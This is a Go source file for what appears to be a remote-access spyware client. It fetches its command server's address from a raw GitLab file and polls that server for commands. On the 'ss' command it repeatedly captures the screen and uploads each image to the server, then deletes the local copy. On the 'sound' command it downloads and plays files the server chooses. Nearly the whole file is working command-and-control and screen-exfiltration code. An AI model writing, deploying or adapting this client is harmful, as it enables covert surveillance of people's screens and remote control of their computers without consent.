package main

import (
	"fmt"
	"image/png"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ebitengine/oto/v3"
	"github.com/hajimehoshi/go-mp3"
	"github.com/vova616/screenshot"
)

var serverIp string = "unknown"
var userInput string = ""
var mutex sync.Mutex
var audioCtx *oto.Context
var readyChan <-chan struct{}

func fetchTunnelURL() string {
	resp, err := http.Get("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt")
	if err != nil {
		fmt.Println("Error fetching gist:", err)
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading gist:", err)
		return ""
	}

	return strings.TrimSpace(string(body))
}

func ss() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		fmt.Println("Error capturing screenshot:", err)
	}
	f, err := os.Create("./ss.webp")
	if err != nil {
		fmt.Println("Error creating file:", err)
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		fmt.Println("Error encoding PNG:", err)
		panic(err)
	}
	f.Close()
}

func sendFile(filePath string, mediaType string) string {
	Path := filePath
	file, err := os.Open(Path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Prepare the network request targeting the cloudflare ip
	targetURL := serverIp + "/upload"
	req, err := http.NewRequest("POST", targetURL, file)
	if err != nil {
		panic(err)
	}

	// Attach metadata instructions in the headers
	req.Header.Set("X-Media-Type", mediaType)
	req.Header.Set("X-File-Name", Path)

	// Dispatch the stream
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	os.Remove(Path)
	var output string = "Server Response Status: " + resp.Status
	return (output)
}

// receive file from server
func downloadFile(fileName string) error {
	resp, err := http.Get(serverIp + "/download?file=" + fileName)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func fetchCommand() string {

	resp, err := http.Get(serverIp + "/get-command")
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return "idle"
	}

	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "idle"
	}

	return string(bodyBytes)
}

// command to play sounds the server defines built for mp3
func playSound(fileName string) {
	file, err := os.Open(fileName)
	if err != nil {
		panic("opening sound.mp3 failed: " + err.Error())
	}

	decodedMp3, err := mp3.NewDecoder(file)
	if err != nil {
		panic("mp3.NewDecoder failed: " + err.Error())
	}

	player := audioCtx.NewPlayer(decodedMp3)
	player.Play()

	for player.IsPlaying() {
		time.Sleep(time.Millisecond)
	}
}
func main() {
	op := &oto.NewContextOptions{}
	op.SampleRate = 44100
	op.ChannelCount = 2
	op.Format = oto.FormatSignedInt16LE

	var err error
	audioCtx, readyChan, err = oto.NewContext(op)
	if err != nil {
		panic(err)
	}
	<-readyChan

	fmt.Println("Finding tunnel URL...")
	tunnelURL := fetchTunnelURL()
	mutex.Lock()
	serverIp = tunnelURL
	mutex.Unlock()

	fmt.Println("Tunnel URL fetched:", tunnelURL)
	fmt.Println("Starting command client...")

	for true {
		userInput = fetchCommand()
		command := strings.Fields(userInput)
		time.Sleep(2 * time.Second)
		fmt.Printf("Received command from server: %s\n", userInput)
		if len(command) != 0 {
			switch command[0] {

			case "idle":
				time.Sleep(5 * time.Second)

			case "ss":
				i := 0
				fmt.Println("Using numeric value")

				n, err := strconv.Atoi(command[1])

				if err != nil {
					fmt.Println(err)
				}

				for i < n {
					ss()
					output := sendFile("./ss.webp", "image")
					fmt.Println(output)
					time.Sleep(500 * time.Millisecond)
					fmt.Println(i)
					i++
				}

			case "sound":
				fmt.Println("Downloading sound file...")
				err := downloadFile(command[1])
				if err != nil {
					fmt.Println("Error downloading sound file:", err)
					break
				}
				fmt.Println("Sound file downloaded successfully.")
				fmt.Println("Playing sound...")
				playSound(command[1])
				fmt.Println("Sound playback finished. Deleting sound file...")
				time.Sleep(1 * time.Second)
				err = os.Remove(command[1])
				if err != nil {
					fmt.Println("Error deleting sound file:", err)
				}

			default:
				time.Sleep(2 * time.Second)

				if strings.HasPrefix(userInput, "error") {
					mutex.Lock()
					tunnelURL = "unknown"
					mutex.Unlock()

					fmt.Println("Server down, looking for new tunnel URL...")
					time.Sleep(5 * time.Second)
					tunnelURL = fetchTunnelURL()
					time.Sleep(5 * time.Second)
					mutex.Lock()
					serverIp = tunnelURL
					mutex.Unlock()
					fmt.Println("Tunnel URL fetched:", tunnelURL)
				}

			}
		}
	}
}
